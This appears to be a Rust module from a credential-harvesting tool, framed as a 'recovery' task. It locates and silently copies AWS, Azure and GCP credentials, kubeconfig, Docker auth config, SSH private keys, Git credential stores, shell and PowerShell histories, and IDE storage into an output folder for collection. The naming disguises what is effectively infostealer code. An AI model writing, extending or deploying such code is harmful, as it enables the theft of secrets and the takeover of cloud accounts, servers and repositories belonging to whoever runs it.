use crate::recovery::{
    context::RecoveryContext,
    fs::sanitize_label,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::env;
use std::path::PathBuf;
use std::sync::Arc;
use tokio::fs;
use tokio::task::JoinSet;

pub fn devops_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(DevOpsRecoveryTask::new(ctx))]
}

struct DevOpsRecoveryTask {
    specs: Vec<DevOpsSpec>,
}

#[derive(Clone)]
struct DevOpsSpec {
    label: String,
    path: PathBuf,
    is_dir: bool,
    filters: Option<Vec<String>>,
}

impl DevOpsRecoveryTask {
    fn new(ctx: &RecoveryContext) -> Self {
        let home = &ctx.home_dir;
        let appdata = &ctx.roaming_data_dir;
        let mut specs = Vec::new();

        let aws_creds = env::var("AWS_SHARED_CREDENTIALS_FILE")
            .map(PathBuf::from)
            .unwrap_or_else(|_| home.join(".aws").join("credentials"));
        specs.push(DevOpsSpec {
            label: "AWS Credentials".into(),
            path: aws_creds,
            is_dir: false,
            filters: None,
        });

        let aws_config = env::var("AWS_CONFIG_FILE")
            .map(PathBuf::from)
            .unwrap_or_else(|_| home.join(".aws").join("config"));
        specs.push(DevOpsSpec {
            label: "AWS Config".into(),
            path: aws_config,
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "Azure Profile".into(),
            path: home.join(".azure").join("azureProfile.json"),
            is_dir: false,
            filters: None,
        });
        specs.push(DevOpsSpec {
            label: "Azure Tokens".into(),
            path: home.join(".azure").join("accessTokens.json"),
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "GCP Credentials".into(),
            path: home.join(".config").join("gcloud").join("credentials.db"),
            is_dir: false,
            filters: None,
        });

        if let Ok(k_config) = env::var("KUBECONFIG") {
            for (i, path) in env::split_paths(&k_config).enumerate() {
                specs.push(DevOpsSpec {
                    label: format!("Kubeconfig (Env {})", i),
                    path,
                    is_dir: false,
                    filters: None,
                });
            }
        } else {
            specs.push(DevOpsSpec {
                label: "Kubeconfig".into(),
                path: home.join(".kube").join("config"),
                is_dir: false,
                filters: None,
            });
        }

        let docker_config = env::var("DOCKER_CONFIG")
            .map(PathBuf::from)
            .map(|p| p.join("config.json"))
            .unwrap_or_else(|_| home.join(".docker").join("config.json"));
        specs.push(DevOpsSpec {
            label: "Docker Config".into(),
            path: docker_config,
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "SSH Keys".into(),
            path: home.join(".ssh"),
            is_dir: true,
            filters: Some(vec![
                "id_rsa".into(),
                "id_ed25519".into(),
                "id_ecdsa".into(),
                "id_dsa".into(),
                "known_hosts".into(),
                "config".into(),
                "authorized_keys".into(),
            ]),
        });

        specs.push(DevOpsSpec {
            label: "Git Config".into(),
            path: home.join(".gitconfig"),
            is_dir: false,
            filters: None,
        });
        specs.push(DevOpsSpec {
            label: "Git Credentials".into(),
            path: home.join(".git-credentials"),
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "Terraform RC".into(),
            path: home.join(".terraform.rc"),
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "Bash History".into(),
            path: home.join(".bash_history"),
            is_dir: false,
            filters: None,
        });
        specs.push(DevOpsSpec {
            label: "Zsh History".into(),
            path: home.join(".zsh_history"),
            is_dir: false,
            filters: None,
        });
        specs.push(DevOpsSpec {
            label: "PowerShell History".into(),
            path: appdata
                .join("Microsoft")
                .join("Windows")
                .join("PowerShell")
                .join("PSReadLine")
                .join("ConsoleHost_history.txt"),
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "VS Code User".into(),
            path: appdata.join("Code").join("User"),
            is_dir: true,
            filters: Some(vec![
                "settings.json".into(),
                "keybindings.json".into(),
                "globalStorage".into(),
                "snippets".into(),
            ]),
        });

        specs.push(DevOpsSpec {
            label: "JetBrains".into(),
            path: appdata.join("JetBrains"),
            is_dir: true,
            filters: Some(vec![
                "options".into(),
                "keymaps".into(),
                "permanent_id".into(),
            ]),
        });

        Self { specs }
    }
}

#[async_trait]
impl RecoveryTask for DevOpsRecoveryTask {
    fn label(&self) -> String {
        "Cloud & DevOps Credentials".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Other
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let base_dest = ctx.output_dir.join("services").join("DevOps");
        fs::create_dir_all(&base_dest).await?;

        let mut set = JoinSet::new();

        for spec in &self.specs {
            let spec = spec.clone();
            let dest_root = base_dest.clone();

            set.spawn(async move {
                if !spec.path.exists() {
                    return Vec::new();
                }

                let mut task_artifacts = Vec::new();
                let dest = dest_root.join(sanitize_label(&spec.label));

                if spec.is_dir {
                    if let Some(filters) = spec.filters {
                        for filter in filters {
                            let source = spec.path.join(&filter);
                            if !source.exists() {
                                continue;
                            }
                            let target = dest.join(&filter);
                            let meta = match fs::metadata(&source).await {
                                Ok(m) => m,
                                Err(_) => continue,
                            };

                            if meta.is_dir() {
                                let _ = crate::recovery::fs::copy_dir_limited(
                                    &source,
                                    &target,
                                    &spec.label,
                                    &mut task_artifacts,
                                    10,  // depth
                                    100, // limit
                                )
                                .await;
                            } else {
                                let _ = fs::create_dir_all(&target.parent().unwrap()).await;
                                if let Ok(_) = fs::copy(&source, &target).await {
                                    task_artifacts.push(RecoveryArtifact {
                                        label: spec.label.clone(),
                                        path: target,
                                        size_bytes: meta.len(),
                                        modified: meta.modified().ok(),
                                    });
                                }
                            }
                        }
                    } else {
                        let _ = crate::recovery::fs::copy_dir_limited(
                            &spec.path,
                            &dest,
                            &spec.label,
                            &mut task_artifacts,
                            5,
                            500,
                        )
                        .await;
                    }
                } else {
                    if let Ok(meta) = fs::metadata(&spec.path).await {
                        if meta.is_file() {
                            let _ = fs::create_dir_all(&dest).await;
                            let file_name = spec
                                .path
                                .file_name()
                                .unwrap_or_else(|| std::ffi::OsStr::new("file"));
                            let target_path = dest.join(file_name);
                            if let Ok(_) = fs::copy(&spec.path, &target_path).await {
                                task_artifacts.push(RecoveryArtifact {
                                    label: spec.label,
                                    path: target_path,
                                    size_bytes: meta.len(),
                                    modified: meta.modified().ok(),
                                });
                            }
                        }
                    }
                }
                task_artifacts
            });
        }

        while let Some(res) = set.join_next().await {
            if let Ok(mut items) = res {
                artifacts.append(&mut items);
            }
        }

        Ok(artifacts)
    }
}
